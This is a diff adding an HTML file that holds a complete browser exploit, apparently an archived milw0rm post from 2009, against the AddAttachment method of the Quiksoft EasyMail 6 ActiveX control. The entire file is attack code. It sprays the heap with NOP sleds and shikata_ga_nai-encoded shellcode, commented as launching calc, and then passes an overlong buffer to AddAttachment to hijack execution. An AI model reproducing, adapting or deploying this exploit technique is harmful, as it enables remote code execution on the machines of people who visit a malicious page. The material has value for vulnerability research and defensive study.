@@ -1,0 +1,56 @@
+<html>
+ <head>
+    <!--
+      -- Quiksoft EasyMail 6 (AddAttachment) Remote Buffer Overflow Exploit
+      -- 
+      -- Its old and the latest version doesn't support this method. 
+      -- I was bored and a similar post sparked my interest. 
+      -- 
+      -- Advisory: http://www.bmgsec.com.au/advisory/48/
+      -- 
+      -- Written by:
+      -- bmgsec (bmgsec [at] gmail.com / www.bmgsec.com.au)
+      --  -->
+ <title>Quiksoft EasyMail 6 (AddAttachment) Remote Buffer Overflow Exploit</title>
+<object classid='clsid:68AC0D5F-0424-11D5-822F-00C04F6BA8D9' id='test'></object>
+<script language='javascript'>
+       function str_repeat ( input, multiplier ) {
+               return new Array(multiplier+1).join(input);
+       }
+
+       //windows/exec CMD: calc Size: 144 bytes Encoder: x86/shikata_ga_nai ExitFunc: SEH
+       shellcode = unescape("%uc931%u1eb1%ue2b8%udc1f%ud9cc%ud9e5%u2474%u5bf4%u4331%u830f%ufceb"+
+                            "%u4303%ufde9%u3029%u4505%uc9d2%ucdd5%uf597%uad5e%u7e12%ua161%u3196"+
+                            "%ub679%uedf6%u2378%u6541%u384e%u9753%ufe9f%ucbcd%u3e5b%u1499%u75a2"+
+                            "%u1a6f%u61e6%u2784%u51b2%u2d61%u11df%ue936%ucd1e%u7aaf%u5a2c%u22bb"+
+                            "%u5d30%u5750%ud654%u83a7%ub4ed%u5783%u1b2e%ua1fd%uf2d0%uc699%ucb56"+
+                            "%u99ea%ua05a%u059d%u3dcf%u3e35%uba86%ufe45%u6af2%u0f22%u8f88%u87ed"+
+                            "%u7114%u569b%u7173%u057b%ue11a%ucae7");
+
+       bigblock = unescape("%u9090%u9090");
+       headersize = 20;
+       slackspace = headersize + shellcode.length;
+
+       while (bigblock.length < slackspace)
+               bigblock += bigblock;
+
+       fillblock = bigblock.substring(0, slackspace);
+       block = bigblock.substring(0, bigblock.length - slackspace);
+
+       while (block.length + slackspace < 200000)
+               block = block + block + fillblock;
+
+       memory = new Array();
+       for (i=0; i<500; i++)
+               memory[i] = block + shellcode;
+
+       buffer = str_repeat('A', 433);
+       buffer += "BBBB";
+       buffer += str_repeat(unescape("%0b%0b%0b%0b"), 63);
+
+       test.AddAttachment(buffer, 1);
+</script>
+</head>
+</html>
+
+# milw0rm.com [2009-09-17]
